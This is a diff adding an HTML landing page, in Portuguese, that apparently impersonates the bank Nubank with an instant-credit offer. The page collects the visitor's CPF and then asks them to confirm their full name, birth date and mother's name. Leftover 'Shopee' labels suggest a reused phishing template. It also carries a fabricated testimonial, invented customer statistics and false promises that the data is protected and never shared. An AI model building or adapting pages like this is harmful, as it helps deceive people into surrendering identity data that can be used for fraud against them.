@@ -1,0 +1,695 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <style>
+        .text-white {
+            color: white !important;
+        }
+    </style>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Nubank</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <link rel="stylesheet" href="/01/css/AZLg1bRWIaGg.css">
+
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        shopee: {
+                            light: "#cab600",
+                            DEFAULT: "#9903d6",
+                            dark: "#19c40a",
+                        },
+                    },
+                },
+            },
+        };
+    </script>
+
+    <style>
+        body {
+            font-family: "Poppins", sans-serif;
+            background-color: #f6f6f6;
+        }
+
+        .shopee-gradient {
+            background: linear-gradient(135deg, #9903d6 0%, #9903d6 100%);
+        }
+
+        .card {
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            border-radius: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .card:hover {
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .number-highlight {
+            background: linear-gradient(90deg, #9903d6 0%, #9903d6 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 700;
+        }
+
+        .btn-shine {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-shine:after {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(to right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 0.3) 50%, rgba(255, 255, 255, 0) 100%);
+            transform: rotate(30deg);
+            animation: shine 4s infinite;
+        }
+
+        @keyframes shine {
+            0% {
+                left: -100%;
+                opacity: 0;
+            }
+
+            10% {
+                left: 100%;
+                opacity: 0.6;
+            }
+
+            100% {
+                left: 100%;
+                opacity: 0;
+            }
+        }
+
+        .floating {
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(0px);
+            }
+
+            50% {
+                transform: translateY(-10px);
+            }
+
+            100% {
+                transform: translateY(0px);
+            }
+        }
+
+        /* Garantir que os ícones sejam perfeitamente redondos */
+        .icon-circle {
+            width: 44px;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+
+        /* Posição da imagem do cartão */
+        .card-image {
+            position: absolute;
+            right: 5px;
+            top: 35%;
+            transform: translateY(-50%);
+            z-index: 1;
+            width: 150px;
+        }
+
+        /* Media queries para ajustar posição em telas menores */
+        @media (max-width: 380px) {
+            .card-image {
+                top: 30%;
+                right: 0;
+                width: 130px;
+            }
+        }
+
+        /* Carrossel simplificado */
+        .carousel {
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+            border-radius: 12px;
+        }
+
+        .carousel-inner {
+            display: flex;
+            transition: transform 0.5s ease;
+            height: 100%;
+        }
+
+        .carousel-item {
+            width: 100%;
+            flex-shrink: 0;
+        }
+
+        .carousel-item.active {
+            display: block;
+        }
+
+        .carousel-item:not(.active) {
+            display: none;
+        }
+
+        .carousel-img-container {
+            background-color: #f8f8f8;
+            border-radius: 16px;
+            padding: 20px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            margin-bottom: 20px;
+            height: 300px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .carousel-img {
+            max-width: 100%;
+            max-height: 260px;
+            object-fit: contain;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        }
+
+        .carousel-controls {
+            position: relative;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 15px 0;
+        }
+
+        .step-number {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            border: 2px solid #ccc;
+            color: #777;
+            background-color: white;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            z-index: 2;
+
+        }
+
+        .step-number.active {
+            border-color: #9903d6;
+            background-color: #9903d6;
+            color: white;
+        }
+
+        .step-number.completed {
+            border-color: #9903d6;
+            background-color: #9903d6;
+            color: white;
+        }
+
+        .step-line {
+            flex: 1;
+            height: 3px;
+            background-color: #ddd;
+            position: relative;
+        }
+
+        .step-line.active {
+            background-color: #9903d6;
+        }
+
+        .carousel-indicators {
+            display: flex;
+            justify-content: center;
+            margin-top: 15px;
+        }
+
+        .carousel-indicator {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: #ddd;
+            margin: 0 5px;
+            cursor: pointer;
+        }
+
+        .carousel-indicator.active {
+            background-color: #9903d6;
+            transform: scale(1.3);
+        }
+
+        .carousel-arrow {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            z-index: 10;
+        }
+
+        .carousel-arrow.prev {
+            left: 10px;
+        }
+
+        .carousel-arrow.next {
+            right: 10px;
+        }
+
+        /* Efeitos de transição para telas */
+        .page-transition {
+            transition: opacity 0.4s ease, transform 0.4s ease;
+        }
+
+        .fade-out {
+            opacity: 0;
+            transform: translateY(20px);
+        }
+
+        .fade-in {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .pulse-yellow {
+            position: relative;
+            z-index: 1;
+            animation: pulse-yellow 1.5s infinite;
+        }
+
+        @keyframes pulse-yellow {
+            0% {
+                box-shadow: 0 0 0 0 rgba(153, 3, 214, 0.7);
+            }
+
+            70% {
+                box-shadow: 0 0 0 15px rgba(153, 3, 214, 0);
+            }
+
+            100% {
+                box-shadow: 0 0 0 0 rgba(153, 3, 214, 0);
+            }
+        }
+    </style>
+</head>
+
+<body class="bg-[#f1f1f1]">
+    <!-- Página principal -->
+    <div id="mainPage" class="max-w-md mx-auto min-h-screen flex flex-col relative page-transition">
+        <!-- Header with Brand -->
+        <div class="flex items-center justify-between p-4 " style="background-color: #9903d6;">
+            <a href="#" class="text-shopee text-2xl"><i class="fas fa-arrow-left"></i></a>
+            <div class="flex items-center">
+                <img src="/01/images/AbF2AddevwXc.webp" alt="Shopee Logo" class="h-8">
+                <span class="ml-2 text-xl font-bold text-shopee" style="color:#fff"></span>
+            </div>
+            <div class="w-6"></div>
+            <!-- Spacer for balance -->
+        </div>
+
+        <!-- Hero Section -->
+        <div class="text-white rounded-b-3xl relative overflow-hidden" style="min-height: 280px">
+            <img src="/01/images/7HNSwG3c3i9z.jpg" class="w-full absolute" alt="">
+        </div>
+
+        <!-- Card de vantagens com sobreposição -->
+        <div class="px-4" style="margin-top: -40px; position: relative; z-index: 10">
+            <div class="bg-[#f2f2f3] card p-6">
+                <h2 class="text-xl font-semibold text-gray-800 mb-5 text-center">
+                    Vantagens exclusivas
+                </h2>
+
+                <div class="space-y-5">
+                    <div class="flex items-center bg-gray-50 p-4 rounded-xl">
+                        <div class="bg-shopee text-white icon-circle mr-4">
+                            <i class="fas fa-bolt text-lg" style="color:white"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-medium text-gray-800">Dinheiro na hora</h3>
+                            <p class="text-sm text-gray-600">
+                                Direto em sua conta Nubank
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="flex items-center bg-gray-50 p-4 rounded-xl">
+                        <div class="bg-yellow-500 text-white icon-circle mr-4">
+                            <i class="fas fa-shield-alt text-lg" style="color:white"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-medium text-gray-800">Sem burocracia</h3>
+                            <p class="text-sm text-gray-600">Sem consulta ao SPC/Serasa</p>
+                        </div>
+                    </div>
+
+                    <div class="flex items-center bg-gray-50 p-4 rounded-xl">
+                        <div class="bg-teal-500 text-white icon-circle mr-4">
+                            <i class="fab fa-pix text-lg" style="color:white"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-medium text-gray-800">Pague com PIX</h3>
+                            <p class="text-sm text-gray-600">Parcele em até 12 vezes</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Botão principal -->
+                <button id="btnAtivar" class="pulse-yellow w-full text-black bg-shopee hover:bg-shopee-dark text-lg font-bold py-4 rounded-xl mt-6 btn-shine" style="color:white">
+                    Ativar meu crédito agora
+                </button>
+
+                <!-- Input CPF (oculto inicialmente) -->
+                <div id="cpfForm" class="mt-6 hidden">
+                    <p class="text-gray-700 mb-3">Digite seu CPF para continuar:</p>
+                    <div class="flex">
+                        <input type="text" id="cpfInput" placeholder="000.000.000-00" class="flex-1 border border-gray-300 rounded-l-xl p-3 focus:outline-none focus:ring-2 focus:ring-shopee focus:border-transparent">
+                        <button id="btnContinuar" class="bg-shopee text-white px-4 py-3 rounded-r-xl">
+                            Continuar
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Confiança -->
+                <div class="flex items-center justify-center mt-5 border-t pt-4 text-gray-600">
+                    <i class="fas fa-lock mr-2 text-black"></i>
+                    <span class="text-sm text-black">Seus dados estão <span class="font-semibold">protegidos</span> e
+                        <span class="font-semibold">seguros</span></span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Como Aplicar (Carrossel) -->
+        <div class="px-4 mt-6">
+            <div class="bg-white card p-5">
+                <h2 class="text-xl font-semibold text-gray-800 mb-5 text-center">
+                    Como Aplicar?
+                </h2>
+
+                <!-- Indicadores de etapas (números) -->
+                <div class="carousel-controls">
+                    <div class="step-number active" id="step1" data-step="0">1</div>
+                    <div class="step-line" id="line1"></div>
+                    <div class="step-number" id="step2" data-step="1">2</div>
+                    <div class="step-line" id="line2"></div>
+                    <div class="step-number" id="step3" data-step="2">3</div>
+                </div>
+
+                <!-- Carrossel -->
+                <div id="carousel" class="carousel">
+                    <!-- Botões de navegação -->
+                    <div id="prev-btn" class="carousel-arrow prev">
+                        <i class="fas fa-chevron-left text-shopee"></i>
+                    </div>
+                    <div id="next-btn" class="carousel-arrow next">
+                        <i class="fas fa-chevron-right text-shopee"></i>
+                    </div>
+
+                    <!-- Slides -->
+                    <div class="carousel-item active">
+                        <div class="carousel-img-container">
+                            <img src="/01/images/r4xwwBDdsk8i.jpeg" alt="Etapa 1" class="carousel-img">
+                        </div>
+                        <p class="text-center text-gray-800 font-medium">
+                            <span class="font-bold">1.</span> Tenha em mãos seu CPF e
+                            preencha seus dados para ver a proposta
+                        </p>
+                    </div>
+
+                    <div class="carousel-item">
+                        <div class="carousel-img-container">
+                            <img src="/01/images/DdTMiyAdCWfL.jpeg" alt="Etapa 2" class="carousel-img">
+                        </div>
+                        <p class="text-center text-gray-800 font-medium">
+                            <span class="font-bold">2.</span> Escolha o valor e o número de
+                            parcelas
+                        </p>
+                    </div>
+
+                    <div class="carousel-item">
+                        <div class="carousel-img-container">
+                            <img src="/01/images/YbdDbm1NQrvo.jpeg" alt="Etapa 3" class="carousel-img">
+                        </div>
+                        <p class="text-center text-gray-800 font-medium">
+                            <span class="font-bold">3.</span> Pronto! Se aprovado, o
+                            dinheiro cairá imediatamente em sua conta Nubank
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Indicadores do carrossel -->
+                <div class="carousel-indicators">
+                    <div class="carousel-indicator active" data-index="0"></div>
+                    <div class="carousel-indicator" data-index="1"></div>
+                    <div class="carousel-indicator" data-index="2"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Estatísticas de confiança -->
+        <div class="px-4 mt-5">
+            <div class="bg-white card p-5 flex justify-between">
+                <div class="text-center">
+                    <p class="number-highlight text-2xl font-bold">+500mil</p>
+                    <p class="text-xs text-gray-600">Clientes</p>
+                </div>
+                <div class="text-center">
+                    <p class="number-highlight text-2xl font-bold">4.8/5</p>
+                    <p class="text-xs text-gray-600">Avaliação</p>
+                </div>
+                <div class="text-center">
+                    <p class="number-highlight text-2xl font-bold">5 min</p>
+                    <p class="text-xs text-gray-600">Aprovação</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Simulador -->
+        <div class="px-4 mt-5">
+            <button id="btnSimular" class="bg-white card p-4 flex items-center justify-between w-full text-left">
+                <div class="flex items-center">
+                    <div class="bg-gray-100 icon-circle mr-3">
+                        <i class="fas fa-calculator text-shopee"></i>
+                    </div>
+                    <div>
+                        <p class="font-medium text-gray-800">Simular Empréstimo</p>
+                        <p class="text-xs text-gray-600">
+                            Veja opções personalizadas para você
+                        </p>
+                    </div>
+                </div>
+                <i class="fas fa-chevron-right text-shopee"></i>
+            </button>
+        </div>
+
+        <!-- Depoimentos -->
+        <div class="px-4 mt-5 mb-10">
+            <div class="bg-white card p-4">
+                <div class="flex items-center mb-3">
+                    <div class="bg-shopee-light bg-opacity-20 rounded-full p-2">
+                        <i class="fas fa-quote-right text-shopee"></i>
+                    </div>
+                    <p class="ml-2 font-medium text-gray-800">
+                        O que dizem nossos clientes
+                    </p>
+                </div>
+
+                <div class="border-l-4 border-shopee-light pl-3 py-1">
+                    <p class="text-sm text-gray-600 italic">
+                        "Processo super rápido, o dinheiro caiu na minha conta em menos de
+                        24h! Recomendo!"
+                    </p>
+                    <div class="flex items-center mt-1">
+                        <p class="text-xs font-medium text-gray-800">Mariana S.</p>
+                        <div class="flex ml-2">
+                            <i class="fas fa-star text-yellow-400 text-xs"></i>
+                            <i class="fas fa-star text-yellow-400 text-xs"></i>
+                            <i class="fas fa-star text-yellow-400 text-xs"></i>
+                            <i class="fas fa-star text-yellow-400 text-xs"></i>
+                            <i class="fas fa-star text-yellow-400 text-xs"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Página de CPF (inicialmente oculta) -->
+    <div id="cpfPage" class="max-w-md mx-auto min-h-screen flex flex-col relative bg-white page-transition opacity-0 hidden">
+        <!-- Header com voltar -->
+        <div class="flex items-center p-4 border-b" style="background-color: #9903d6;">
+            <button id="btnVoltar" class="text-shopee text-2xl mr-3">
+                <i class="fas fa-arrow-left"></i>
+            </button>
+            <div class="flex items-center">
+                <img src="/01/images/AbF2AddevwXc.webp" alt="Shopee Logo" class="h-8">
+                <span class="ml-2 text-xl font-bold text-shopee"></span>
+            </div>
+        </div>
+
+        <!-- Conteúdo da página de CPF -->
+        <div class="flex-1 p-6 flex flex-col">
+            <div class="mb-8">
+                <h1 class="text-2xl font-bold text-gray-800 mb-2">
+                    Pré-análise de crédito
+                </h1>
+                <p class="text-gray-600">
+                    Para prosseguir com a análise do seu crédito, precisamos verificar
+                    seus dados. Esta consulta é rápida e não afeta seu score de crédito.
+                </p>
+            </div>
+
+            <div class="bg-blue-50 p-4 rounded-xl mb-8">
+                <div class="flex items-center">
+                    <div class="bg-blue-100 icon-circle mr-3 flex-shrink-0">
+                        <i class="fas fa-info-circle text-blue-600"></i>
+                    </div>
+                    <p class="text-sm text-blue-800">
+                        Seus dados são protegidos por criptografia e nunca serão
+                        compartilhados com terceiros.
+                    </p>
+                </div>
+            </div>
+
+            <div class="mb-4">
+                <label for="cpfInputPage" class="block text-gray-700 font-medium mb-2">CPF:</label>
+                <input type="tel" id="cpfInputPage" placeholder="000.000.000-00" class="w-full border border-gray-300 rounded-xl p-4 focus:outline-none focus:ring-2 focus:ring-shopee focus:border-transparent text-lg">
+                <p class="text-sm text-gray-500 mt-1">
+                    Digite apenas os números do seu CPF
+                </p>
+            </div>
+
+            <div class="flex items-center mb-6">
+                <input type="checkbox" id="termsCheck" class="mr-2 h-5 w-5 text-shopee">
+                <label for="termsCheck" class="text-sm text-gray-700">Concordo com os
+                    <a href="#" class="text-shopee font-medium">Termos de Uso</a> e
+                    <a href="#" class="text-shopee font-medium">Política de Privacidade</a></label>
+            </div>
+
+            <button id="btnAnalisar" class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl mt-auto btn-shine" style="color:white">
+                Solicitar análise
+            </button>
+
+            <!-- Seção para exibir os resultados da consulta (inicialmente oculta) -->
+            <div id="consultaResultado" class="mt-6 hidden">
+                <div class="bg-gray-50 p-4 rounded-xl">
+                    <h3 class="text-lg font-bold text-gray-800 mb-3">
+                        Confirme seus dados
+                    </h3>
+
+                    <!-- Carregando (inicialmente visível dentro da seção de resultados) -->
+                    <div id="loadingInfo" class="flex flex-col items-center py-4">
+                        <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-shopee mb-3"></div>
+                        <p class="text-gray-600">Consultando seus dados...</p>
+                    </div>
+
+                    <!-- Informações do usuário (inicialmente oculto) -->
+                    <div id="userInfo" class="hidden">
+                        <div class="space-y-3">
+                            <div class="flex justify-between border-b pb-2">
+                                <span class="text-gray-600">Nome completo:</span>
+                                <span id="nomeUsuario" class="font-semibold text-gray-800"></span>
+                            </div>
+                            <div class="flex justify-between border-b pb-2">
+                                <span class="text-gray-600">Data de nascimento:</span>
+                                <span id="dataNascimento" class="font-semibold text-gray-800"></span>
+                            </div>
+                            <div class="flex justify-between border-b pb-2">
+                                <span class="text-gray-600">CPF:</span>
+                                <span id="cpfUsuario" class="font-semibold text-gray-800"></span>
+                            </div>
+                            <div class="flex justify-between border-b pb-2">
+                                <span class="text-gray-600">Sexo:</span>
+                                <span id="sexoUsuario" class="font-semibold text-gray-800"></span>
+                            </div>
+                            <div class="flex justify-between pb-2">
+                                <span class="text-gray-600">Nome da mãe:</span>
+                                <span id="nomeMae" class="font-semibold text-gray-800"></span>
+                            </div>
+                        </div>
+
+                        <div class="mt-6 flex flex-col space-y-3">
+                            <p class="text-sm text-gray-700">Estes dados estão corretos?</p>
+                            <button id="btnConfirmar" class="w-full bg-shopee hover:bg-shopee-dark text-white font-bold py-3 rounded-xl">
+                                Sim, continuar
+                            </button>
+                            <button id="btnCorrigir" class="w-full bg-white border border-shopee text-shopee font-bold py-3 rounded-xl">
+                                Não, desejo corrigir
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Mensagem de erro (inicialmente oculta) -->
+                    <div id="errorInfo" class="hidden">
+                        <div class="bg-red-50 p-4 rounded-lg flex items-start">
+                            <div class="text-red-500 mr-3 mt-1">
+                                <i class="fas fa-exclamation-circle text-xl"></i>
+                            </div>
+                            <div>
+                                <h4 class="font-medium text-red-800">
+                                    Não foi possível consultar seus dados
+                                </h4>
+                                <p id="errorMessage" class="text-sm text-red-600 mt-1">
+                                    Verifique seu CPF e tente novamente.
+                                </p>
+                            </div>
+                        </div>
+                        <button id="btnTentarNovamente" class="w-full bg-shopee hover:bg-shopee-dark text-white font-bold py-3 rounded-xl mt-4">
+                            Tentar novamente
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Carregar o script de manipulação de páginas -->
+    <script src="/01/js/B7PYnCHDexx2.js"></script>
+
+    <!-- Script para preencher o CPF do localStorage -->
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const cpfSalvo = localStorage.getItem("cpf");
+
+            const cpfInputPage = document.getElementById("cpfInputPage");
+
+            if (cpfSalvo && cpfInputPage) {
+                let cpfFormatado = cpfSalvo;
+
+                if (cpfSalvo.length === 11) {
+                    cpfFormatado = cpfSalvo.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
+                }
+
+                cpfInputPage.value = cpfFormatado;
+                
+                console.log("CPF preenchido automaticamente do localStorage");
+            }
+        });
+    </script>
+
+
+
+</body></html>
